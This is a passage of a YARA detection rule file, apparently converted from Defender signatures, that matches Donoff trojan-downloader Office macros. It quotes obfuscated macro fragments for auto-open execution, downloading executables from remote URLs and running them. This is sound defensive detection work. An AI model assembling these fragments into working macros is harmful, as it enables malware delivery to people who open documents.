        $x_1_12 = {28 22 71 e4 71 3a 71 71 7e 73 3b a6 71 78 75 72 3b 79 7b 6f 3a 71 75 7a 7a 6d 71 6e 7e 6d 73 fc a6 3b 3b 46 7c c7 c7 74 22 29}  //weight: 1, accuracy: High
        $x_1_13 = {52 5f 52 77 66 58 54 72 57 54 66 7d 84 75 56 5e 5b 57 82 82 76 51 84 51 5f 5b 5c 5c 53 6e 78 7e 64 50 78 61 7e 84 7a 71 6f 53}  //weight: 1, accuracy: High
        $x_1_14 = "aEpgeFKtonestitt:(NaiNMoodb.e,/NtpOc)(pSoetP.miWpZcdwNyprts]c(fletclaOmh'/." ascii //weight: 1
        $x_1_15 = "\".mpxeio/d/mh.m1Osmotrw.vetm//G:iiylwc2Ttagcr/np/Qwo\"" ascii //weight: 1
        $x_1_16 = "/sfjidjg!ve!fsvusfwvp(m!fe!tspm!svfssf!fov!fsuopdofs!b!espX" ascii //weight: 1
        $x_1_17 = {28 22 74 80 80 7c 7f 46 3b 3b 6d 3a 7c 7b 79 72 3a 6f 6d 80 3b 7c 7b 82 86 71 74 3a 71 84 71 22 29}  //weight: 1, accuracy: High
        $x_1_18 = "= \"kcQmYHdz.zIekxJek kk/QYcL kkpXzoHwAReHrLsLhLAeklLIlkH.YeAxQReLQ k-AwH" ascii //weight: 1
        $x_1_19 = "\"IcV6m2dVk.IkekxILek L4/kcLI ZpLo4wZeVrVsVhL6eVlHlI.2eHxke4 L-VwkV ZhILikIdZVdVevnV" ascii //weight: 1
        $x_1_20 = {49 66 20 63 66 6f 76 72 65 20 3d 20 22 22 20 54 68 65 6e 0d 0a 53 68 65 6c 6c 20 72 6f 6a 75 70 6e 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: High
        $x_1_21 = "+Flxxt>F33{{{4II2wyF4rko4vsvw77erk2FFgsq3Ihs47pwmjg4etps4F6qgw72" ascii //weight: 1
        $x_1_22 = "tpuhso:/uhso/uuhsoniuhsotyuhsostuhsoyduhsoiyuhsoinuhsog.uhsotouhsop/" ascii //weight: 1
        $x_1_23 = {22 22 68 74 74 70 3a 2f 2f 63 64 6e 2e 63 68 65 2e 6d 6f 65 2f 79 6d 75 66 6e 6e 2e 65 78 65 22 22 3e 3e [0-5] 2e 56 42 53}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_216
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 68 72 57 28 31 30 34 29 20 26 20 43 68 72 57 28 31 31 36 29 20 26 20 43 68 72 57 28 31 31 36 29 20 26 20 43 68 72 57 28 31 31 32 29 20 26 20 43 68 72 57 28 35 38 29 20 26 20 43 68 72 57 28 34 37 29 20 26 20 43 68 72 57 28 34 37 29 20 26 20 [0-160] 20 26 20 43 68 72 57 28 34 37 29 20 26 20 43 68 72 57 28 39 38 29 20 26 20 43 68 72 57 28 31 31 36 29 20 26 20 43 68 72 57 28 34 37 29 20 26 20 43 68 72 57 28 39 38 29 20 26 20 43 68 72 57 28 31 31 36 29 20 26 20 43 68 72 57 28 34 37 29 20 26 20 43 68 72 57 28 31 31 32 29 20 26 20 43 68 72 57 28 31 31 32 29 20 26 20 43 68 72 57 28 31 31 36 29 20 26 20 43 68 72 57 28 34 36 29 20 26 20 43 68 72 57 28 31 31 32 29 20 26 20 43 68 72 57 28 31 30 34 29 20 26 20 43 68 72 57 28 31 31 32 29}  //weight: 1, accuracy: Low
        $x_1_2 = "UnsignedHexString2 + \"\\rue\" & Chr(98) + \"fo.\" & \"e\" & Chr(120) & Chr(101)" ascii //weight: 1
        $x_1_3 = "r(77) & \"++\" + Chr(105) & \"(cr)\" & Chr(111) & Chr(130 - 15) & Chr(100 + 11) & Chr(102) & \"t\" & Chr(46) & \"*X\" & Chr(77) & Chr(76) & \"*H\" & Chr(84) & \"TP\")" ascii //weight: 1
        $x_1_4 = "\"/\" & Chr(108) & \"o\" & \"g\" & \"o\" & \".\" & \"g\" & Chr(105) & Chr(102)" ascii //weight: 1
        $x_1_5 = "computer = Array(155, 166, 165, 160, 105, 93, 92, 163, 162, 161, 92, 86, 155, 139, 145, 153, 150, 80, 143, 133, 147, 77, 155, 144, 128, 140, 139, 145, 122, 133, 141, 67, 75, 72, 70, 71, 68, 69, 67, 65, 58, 64, 64, 61, 62, 60, 57, 57, 49, 103, 121, 101)" ascii //weight: 1
        $x_1_6 = "computer = Array(153, 164, 163, 158, 103, 91, 90, 157, 141, 144, 154, 154, 151, 141, 133, 148, 143, 129, 139, 134, 140, 144, 124, 72, 145, 126, 69, 121, 143, 67, 75, 72, 70, 71, 68, 69, 67, 65, 58, 64, 64, 61, 62, 60, 57, 57, 49, 103, 121, 101)" ascii //weight: 1
        $x_1_7 = {3d 20 53 68 65 6c 6c 28 43 68 72 28 39 39 29 20 26 20 43 68 72 28 31 30 39 29 20 26 20 43 68 72 28 31 30 30 29 20 26 20 43 68 72 28 33 32 29 20 26 20 43 68 72 28 34 37 29 20 26 20 43 68 72 28 39 39 29 20 26 20 43 68 72 28 33 32 29 20 26 20 43 68 72 28 31 31 35 29 20 26 20 43 68 72 28 31 31 36 29 20 26 20 43 68 72 28 39 37 29 20 26 20 43 68 72 28 31 31 34 29 20 26 20 43 68 72 28 31 31 36 29 20 26 20 43 68 72 28 33 32 29 20 26 20 43 68 72 28 33 37 29 20 26 20 43 68 72 28 38 34 29 20 26 20 43 68 72 28 37 37 29 20 26 20 43 68 72 28 38 30 29 20 26 20 43 68 72 28 33 37 29 20 26 20 43 68 72 28 34 37 29 20 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-32] 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_8 = {20 3d 20 22 68 74 74 ?? ?? ?? ?? ?? ?? ?? ?? [0-8] 70 3a 2f 2f 22 [0-16] 52 65 70 6c 61 63 65 28 ?? ?? ?? ?? ?? [0-8] 2c 20 22 00 01 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_9 = {45 6c 73 65 49 66 20 28 49 6e 53 74 72 28 28 38 34 20 2d 20 38 33 29 2c 20 ?? ?? ?? ?? ?? ?? ?? ?? [0-8] 2c 20 ?? ?? ?? ?? ?? [0-5] 29 20 3e 20 28 31 30 30 20 2d 20 31 30 30 29 20 41 6e 64 20 4c 65 6e 28 00 01 29 20 3e 20 28 36 36 20 2d 20 36 36 29 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_10 = {2b 20 22 73 64 62 2e 22 ?? ?? ?? ?? ?? ?? ?? [0-3] 20 3d 20 01 02 20 2b 20 22 65 22 20 2b 20 22 22 20 26 20 22 78 65 22}  //weight: 1, accuracy: Low
        $x_1_11 = "ChrW(103 + 1) & ChrW(115 + 1) & ChrW(115 + 1) & ChrW(111 + 1) & ChrW(57 + 1) & ChrW(46 + 1) & ChrW(46 + 1)" ascii //weight: 1
        $x_1_12 = "DDSDHEIGHT1 = tempFolder + \"\\sd\" + lFlagsE + \"zko\" + lFlagsE + \"d\" + \".\" + lFlagsE + \"x\" + lFlagsE" ascii //weight: 1
        $x_1_13 = "\"/wp-content\" & \"/upl\" & \"oads/\" & \"9914DCF.exe\", False" ascii //weight: 1
        $x_1_14 = {73 69 6d 70 6c 65 [0-1] 20 3d 20 22 22 20 2b 20 22 22 20 2b 20 73 69 6d 70 6c 65 [0-1] 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 5c 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 73 74 72 22 20 2b 20 22 22 20 2b 20 22 6e 61 6d 65 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 2e 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 65 22 20 2b 20 22 78 22 20 2b 20 22 65 22}  //weight: 1, accuracy: Low
        $x_1_15 = "\"\\\" + \"d\" + \"u\" + \"s\" + \"nam.\" + \"\" + \"e\" + \"\" + \"\" + \"x\" + \"\" + \"e\"" ascii //weight: 1
        $x_1_16 = {73 74 61 74 53 74 72 20 3d 20 22 22 ?? ?? ?? 63 6f 75 6e 74 65 72 20 3d 20 63 6f 75 6e 74 65 72 20 2b 20 22 2e 22 ?? ?? ?? 6c 6f 67 69 63 42 4f 58 20 3d 20 6e 65 77 59 7a 20 2b 20 22 5c 22 20 2b 20 22 63 6f 6c 6f 63 22 20 2b 20 4c 43 61 73 65 28 63 6f 75 6e 74 65 72 29 20 2b 20 22 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_17 = {53 74 72 52 65 76 65 72 73 65 28 22 70 6d 65 74 22 29 29 29 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 5c 72 61 7a 62 6f 6c 74 61 6c 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 20 2b 20 72 61 7a 20 2b 20 64 76 61}  //weight: 1, accuracy: Low
        $x_1_18 = {53 68 65 6c 64 6f 48 75 62 5f ?? 20 3d 20 41 72 72 61 79 28 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20}  //weight: 1, accuracy: Low
        $x_1_19 = {52 4f 42 49 42 4f 42 5f ?? 20 3d 20 41 72 72 61 79 28 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20 31 31 ?? ?? ?? 2c 20}  //weight: 1, accuracy: Low
        $x_1_20 = {53 41 6d 6f 65 74 75 74 32 3a ?? ?? 20 44 69 6d 20 68 5f 6b 65 79 5f 4c 4d 5f 37 28 29 20 41 73 20 56 61 72 69 61 6e 74 ?? ?? 68 5f 6b 65 79 5f 4c 4d 5f 37 20 3d 20 41 72 72 61 79 28 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20 31 30 ?? ?? ?? 2c 20}  //weight: 1, accuracy: Low
        $x_1_21 = {73 6f 6d 65 68 65 72 6e 79 61 5f 37 20 3d 20 53 70 6c 69 74 28 22 31 31 ?? ?? 7c 31 31 ?? ?? 7c 31 31 ?? ?? 7c 31 31 ?? ?? 7c 31}  //weight: 1, accuracy: Low
        $x_1_22 = {2e 4f 70 65 6e 28 ?? ?? ?? ?? [0-3] 2c 20 ?? ?? ?? ?? [0-3] 2c 20 46 61 6c 73 65 29 ?? ?? ?? ?? ?? ?? [0-4] 20 ?? ?? ?? ?? ?? [0-3] 2e 53 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 28 61 28 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 2c 20 02 00 02 00 2c 20 02 00 02 00 29 2c 20 61 28 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 2c 20 02 00 02 00 2c 20 02 00 02 00 29 29 [0-5] 04 05 20 06 07 2e 53 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 28 61 28 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_E_2147689252_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.E"
        threat_id = "2147689252"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "USE\" & \"RPROFILE\"" ascii //weight: 1
        $x_1_2 = "sa\" + \"vep\" + \"ic\"" ascii //weight: 1
        $x_1_3 = "'ht'+'tp://'+''+'" ascii //weight: 1
        $x_1_4 = "(84) & \"em\" + \"p\"" ascii //weight: 1
        $x_1_5 = ".j\" & \"pg\"" ascii //weight: 1
        $x_1_6 = "bin.b\" + Chr(97) + \"se\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_E_2147689252_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.E"
        threat_id = "2147689252"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "URLDownloadToFile 0, \"http://" ascii //weight: 1
        $x_1_3 = {45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c [0-8] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_4 = {52 75 6e 46 69 6c 65 28 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 [0-8] 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_5 = "Shell \"cmd /k \"\"\" & strFile &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_E_2147689252_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.E"
        threat_id = "2147689252"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 68 74 74 70 3a 2f 2f [0-48] 2e 65 78 65 22 2c 20 45 6e 76 69 72 6f 6e 28 22 54 4d 50 22 29 20 26 20 22 5c [0-10] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 28 30 2c 20 [0-8] 2c 20 [0-8] 2c 20 30 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 68 65 6c 6c 28 [0-8] 2c 20 31 29 [0-16] 4d 73 67 42 6f 78 20 22 [0-32] 64 6f 63 75 6d 65 6e 74 6f 20 6e 6f 20 65 73 20 63 6f 6d 70 61 74 69 62 6c 65 20 63 6f 6e 20 65 73 74 65 20 65 71 75 69 70 6f 2e 22}  //weight: 1, accuracy: Low
        $x_1_4 = "Application.DisplayAlerts = False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_F_2147689253_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.F"
        threat_id = "2147689253"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 20 2b 20 22 72 69 70 22 20 2b 20 4c 43 61 73 65 28 65 72 72 6f 72 4d 73 67 29 20 2b 20 22 2e 53 68 22 20 2b 20 61 72 67 75 6d 65 6e 74 73 20 2b 20 22 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = ".Environment(UCase(\"p\") + \"roc\" + arguments + \"ss" ascii //weight: 1
        $x_1_3 = ".write CodOrdineCorrente1.responseBody" ascii //weight: 1
        $x_1_4 = "UtilsInd2Sub.savetofile dimIndexArgs, 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_F_2147689253_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.F"
        threat_id = "2147689253"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"Microsoft.XMLHTTP\"): Var_007.Open \"GET\", \"http://" ascii //weight: 1
        $x_1_2 = ".ExpandEnvironmentStrings(\"%APPDATA%\"): Dim Var" ascii //weight: 1
        $x_1_3 = ".responseBody: .savetofile Var_002 & \"\\service\\service.exe\"," ascii //weight: 1
        $x_1_4 = ".Run Chr(34) & Var_014 & Chr(34), 1, True:" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147691432_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G"
        threat_id = "2147691432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-21] 29 20 26 20 22 2f 74 73 78 33 22 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 35 20 54 6f 20 4e 6c 0d 0a 44 6f 45 76 65 6e 74 73 0d 0a 4e 65 78 74}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147691432_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G"
        threat_id = "2147691432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ") - 1 To 0 Step -2" ascii //weight: 1
        $x_2_2 = ".Type = 0 + 1" ascii //weight: 2
        $x_2_3 = "= Environ(Module3." ascii //weight: 2
        $x_1_4 = "Sub Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147691432_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G"
        threat_id = "2147691432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"Htt\" + \"p\" + \".\"" ascii //weight: 1
        $x_1_2 = ", \"n\" + \"kiO\" + \"a\" + \"Ws\" + \"g\")" ascii //weight: 1
        $x_1_3 = "= \"\" + \"\" + \".e\" + \"xe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147691432_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G"
        threat_id = "2147691432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+ \"l\" + \"l" ascii //weight: 1
        $x_1_2 = "diskdfrg" ascii //weight: 1
        $x_1_3 = "GetSpecialFolder(2) & \"\\\" + \"\\\"" ascii //weight: 1
        $x_1_4 = "Obama Nuk" ascii //weight: 1
        $x_1_5 = "= \"\" + \"\" + \".exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147691432_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G"
        threat_id = "2147691432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 61 6c 6c 42 79 4e 61 6d 65 28 [0-32] 2c 20 56 62 4d 65 74 68 6f 64 2c 20 22 25 74 65 6d 70 25 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = " & \"\\amnestic.exe\"" ascii //weight: 1
        $x_1_3 = "Put #hanaper, , CByte(\"&\" + Chr(125 - 53) & frau)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147691432_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G"
        threat_id = "2147691432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"Microsof\" + LCase(errorMsg) + \".XMLH\" + errorMsg" ascii //weight: 1
        $x_1_2 = ".Environment(\"Proc\" + arguments + \"ss\")" ascii //weight: 1
        $x_1_3 = ".write CodOrdineCorrente1.responseBody" ascii //weight: 1
        $x_1_4 = "UtilsInd2Sub.savetofile dimIndexArgs, 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147691432_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G"
        threat_id = "2147691432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Kill Environ(StrReverse(cck6VUSC9(Chr$(77) & Chr$(80)" ascii //weight: 1
        $x_1_2 = "Shell yPJLLcAu1 & Chr$(92) & Chr$(120) & Chr$(120) & Chr$(46)" ascii //weight: 1
        $x_1_3 = "dAIUDNAUIDBasida8ydabsu 0, asd, yPJLLcAu1 & Chr$(92) & Chr$(120) & Chr$(120)" ascii //weight: 1
        $x_1_4 = "asd = \"http://\" & \"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_G_2147691432_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.G"
        threat_id = "2147691432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "workbook_open()" ascii //weight: 1
        $x_1_2 = "wshshell.run" ascii //weight: 1
        $x_1_3 = "= wshshell.expandenvironmentstrings(" ascii //weight: 1
        $x_1_4 = ".savetofile" ascii //weight: 1
        $x_1_5 = "Print " ascii //weight: 1
        $x_1_6 = "Temp" ascii //weight: 1
        $x_1_7 = {26 20 43 68 72 24 28 41 73 63 28 4d 69 64 24 28 [0-15] 2c 20 49 2c 20 31 29 29 20 2b 20 41 73 63 28 4d 69 64 24 28 [0-15] 2c 20 4a 2c 20 31 29 29 29}  //weight: 1, accuracy: Low
        $x_1_8 = {73 68 65 6c 6c (20|28)}  //weight: 1, accuracy: Low
        $x_1_9 = "kill " ascii //weight: 1
        $x_1_10 = "savetofile" ascii //weight: 1
        $x_1_11 = "set wshshell = createobject(" ascii //weight: 1
        $x_1_12 = "then goto decrypt" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (11 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_D_2147693618_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.gen!D"
        threat_id = "2147693618"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 6e 76 69 72 6f 6e 24 28 22 74 6d 70 22 29 [0-5] 26 20 22 5c 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {65 6e 76 69 72 6f 6e 24 28 22 61 70 70 64 61 74 61 22 29 [0-5] 26 20 22 5c 22 20 26}  //weight: 1, accuracy: Low
        $x_1_3 = {20 3d 20 65 6e 76 69 72 6f 6e 24 28 22 74 [0-1] 6d 70 22 29 20 26}  //weight: 1, accuracy: Low
        $x_1_4 = " = \"Putty.ex\" & \"e\"" ascii //weight: 1
        $x_1_5 = "\" & \".exe\"" ascii //weight: 1
        $x_1_6 = {22 75 72 6c 6d 6f 6e 22 [0-5] 61 6c 69 61 73 [0-5] 22 75 72 6c 64 6f 77 6e 6c 6f 61 64 74 6f 66 69 6c 65 61 22}  //weight: 1, accuracy: Low
        $x_1_7 = {22 73 68 65 6c 6c 33 32 2e 64 6c 6c 22 [0-5] 61 6c 69 61 73 [0-5] 22 73 68 65 6c 6c 65 78 65 63 75 74 65 61 22}  //weight: 1, accuracy: Low
        $x_1_8 = {30 2c 20 22 6f 70 65 6e 22 2c 20 [0-3] 62 2c 20 22 22 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73}  //weight: 1, accuracy: Low
        $x_1_9 = {30 2c 20 22 6f 70 65 6e 22 2c 20 5f 0d 0a [0-192] 2c 20 22 22 2c 20 76 62 6e 75 6c 6c 73 74 72 69 6e 67 2c 20 76 62 6e 6f 72 6d 61 6c 66 6f 63 75 73}  //weight: 1, accuracy: Low
        $x_1_10 = {63 61 6c 6c 20 73 68 65 6c 6c 28 [0-192] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_11 = {30 2c 20 22 6f 70 65 6e 22 2c 20 [0-192] 2c 20 22 22 2c 20 76 62 6e 75 6c 6c 73 74 72 69 6e 67 2c 20 76 62 6e 6f 72 6d 61 6c 66 6f 63 75 73}  //weight: 1, accuracy: Low
        $x_1_12 = {20 3d 20 22 68 74 74 70 [0-1] 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_13 = ".tt/api/" ascii //weight: 1
